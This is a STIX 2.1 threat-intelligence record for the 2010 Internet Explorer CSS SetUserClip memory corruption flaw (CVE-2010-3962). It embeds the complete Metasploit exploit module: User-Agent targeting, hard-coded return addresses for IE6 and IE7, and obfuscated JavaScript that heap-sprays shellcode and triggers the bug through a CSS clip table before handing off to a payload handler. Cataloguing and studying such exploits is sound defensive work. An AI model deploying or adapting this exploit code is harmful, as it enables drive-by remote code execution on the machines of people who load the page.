{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e98ca03-753d-40ed-b816-45f42dae7731",
    "created": "2024-08-14T16:42:14.844463Z",
    "modified": "2024-08-14T16:42:14.844467Z",
    "name": "MS10-090 Microsoft Internet Explorer CSS SetUserClip Memory Corruption",
    "description": " This module exploits a memory corruption vulnerability within Microsoft's HTML engine (mshtml). When parsing an HTML page containing a specially crafted CSS tag, memory corruption occurs that can lead arbitrary code execution.  It seems like Microsoft code inadvertently increments a vtable pointer to point to an unaligned address within the vtable's function pointers. This leads to the program counter being set to the address determined by the address \"[vtable+0x30+1]\". The particular address depends on the exact version of the mshtml library in use.  Since the address depends on the version of mshtml, some versions may not be exploitable. Specifically, those ending up with a program counter value within another module, in kernel space, or just not able to be reached with various memory spraying techniques.  Also, since the address is not controllable, it is unlikely to be possible to use ROP to bypass non-executable memory protections.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_090_ie_css_clip.rb",
            "external_id": "ms10_090_ie_css_clip.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3962"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  # Unreliable\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #\t:ua_name    => HttpClients::IE,\n  #\t:ua_minver  => \"6.0\",\n  #\t:ua_maxver  => \"7.0\",\n  #\t:javascript => true,\n  #\t:os_name => OperatingSystems::Match::WINDOWS,\n  #\t:vuln_test  => nil, # no way to test without just trying it\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-090 Microsoft Internet Explorer CSS SetUserClip Memory Corruption',\n      'Description'    => %q{\n          This module exploits a memory corruption vulnerability within Microsoft's\n        HTML engine (mshtml). When parsing an HTML page containing a specially\n        crafted CSS tag, memory corruption occurs that can lead arbitrary code\n        execution.\n\n        It seems like Microsoft code inadvertently increments a vtable pointer to\n        point to an unaligned address within the vtable's function pointers. This\n        leads to the program counter being set to the address determined by the\n        address \"[vtable+0x30+1]\". The particular address depends on the exact\n        version of the mshtml library in use.\n\n        Since the address depends on the version of mshtml, some versions may not\n        be exploitable. Specifically, those ending up with a program counter value\n        within another module, in kernel space, or just not able to be reached with\n        various memory spraying techniques.\n\n        Also, since the address is not controllable, it is unlikely to be possible\n        to use ROP to bypass non-executable memory protections.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'unknown',        # discovered in the wild\n          'Yuange',         # PoC posted to twitter under @yuange1975\n          'Matteo Memelli', # exploit-db version\n          'jduck'           # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3962' ],\n          [ 'OSVDB', '68987' ],\n          [ 'BID', '44536' ],\n          [ 'EDB', '15421' ],\n          [ 'MSB', 'MS10-090' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n\n          #\n          # Special target, we put it first so its index doesn't change.\n          #\n          [ 'Debug',\n            {\n              'Ret' => 0x00010101, # tiny spray, sure to crash :)\n            }\n          ],\n\n          #\n          # In the targets below, 'Ret' means where EIP ends up (not under our control)\n          #\n          [ 'Internet Explorer 6',\n            {\n              'Ret' => 0x5c7dc9d0, # mshtml.dll 6.0.2900.3698 @ ?\n              #'Ret' => 0x307dc9c5, # mshtml.dll 6.0.2900.5848 @ 0x7dc30000\n              #'Ret' => 0x0e7dc9cd, # mshtml.dll 6.0.2900.6036 @ 0x7dc30000\n            }\n          ],\n\n          [ 'Internet Explorer 7',\n            {\n              'Ret' => 0x597e85f9, # mshtml.dll 7.0.5730.13 @ 0x7e830000\n            }\n          ],\n\n          #\n          # Although IE8 is affected, we don't currently have a working target for it.\n          #\n=begin\n          [ 'Internet Explorer 8 on Windows 7',\n            {\n              #'Ret' => 0x396392db, # mshtml.dll 8.0.7600.16671 @ 0x62f90000\n              'Ret' => 0x39696cd8, # mshtml.dll 8.0.7600.16671 @ 0x694e0000\n              #'Ret' => 0x7a6902d7, # mshtml.dll 8.00.7600.16385 @ 0x68e40000\n            }\n          ]\n=end\n        ],\n      'DisclosureDate' => '2010-11-03',\n      'DefaultTarget'  => 0))\n  end\n\n  def auto_target(cli, request)\n    mytarget = nil\n\n    agent = request.headers['User-Agent']\n    #print_status(\"Checking user agent: #{agent}\")\n    if agent =~ /MSIE 6\\.0/\n      mytarget = targets[2]   # IE6 on NT, 2000, XP and 2003\n    elsif agent =~ /MSIE 7\\.0/\n      mytarget = targets[3]   # IE7 on XP and 2003\n=begin\n    elsif agent =~ /MSIE 8\\.0/ and agent =~ /Windows NT 6\\.1/\n      mytarget = targets[4]   # IE8 on Windows 7\n=end\n    else\n      print_error(\"Unknown User-Agent #{agent}\")\n    end\n\n    mytarget\n  end\n\n  def on_request_uri(cli, request)\n\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name} (target: #{mytarget.name})\")\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))\n\n    # Set the return\\nops\n    ret = Rex::Text.to_unescape(make_nops(4))\n\n    # Construct the javascript\n    js = <<-EOS\nvar memory = new Array();\nfunction sprayHeap(shellcode, heapSprayAddr, heapBlockSize) {\nvar index;\nvar heapSprayAddr_hi = (heapSprayAddr >> 16).toString(16);\nvar heapSprayAddr_lo = (heapSprayAddr & 0xffff).toString(16);\nwhile (heapSprayAddr_hi.length < 4) { heapSprayAddr_hi = \"0\" + heapSprayAddr_hi; }\nwhile (heapSprayAddr_lo.length < 4) { heapSprayAddr_lo = \"0\" + heapSprayAddr_lo; }\nvar retSlide = unescape(\"#{ret}\");\nwhile (retSlide.length < heapBlockSize) { retSlide += retSlide; }\nretSlide = retSlide.substring(0, heapBlockSize - shellcode.length);\nvar heapBlockCnt = (heapSprayAddr - heapBlockSize)/heapBlockSize;\nfor (index = 0; index < heapBlockCnt; index++) { memory[index] = retSlide + shellcode; }\n}\nvar shellcode = unescape(\"#{shellcode}\");\nsprayHeap(shellcode, #{mytarget.ret}, 0x400000 - (shellcode.length + 0x38));\ndocument.write(\"<table style=position:absolute;clip:rect(0)>\");\nEOS\n    opts = {\n      'Symbols' => {\n        'Variables' => %w{ shellcode retSlide payLoadSize memory index\n          heapSprayAddr_lo heapSprayAddr_hi heapSprayAddr heapBlockSize\n          heapBlockCnt },\n        'Methods'   => %w{ sprayHeap }\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    #js.obfuscate(memory_sensitive: true)\n\n    # Construct the final page\n    html = <<-EOS\n<html>\n<body>\n<script language='javascript'>\n#{js}\n</script>\n</body>\n</html>\nEOS\n\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-03",
    "x_mitre_platforms": [
        "win'"
    ]
}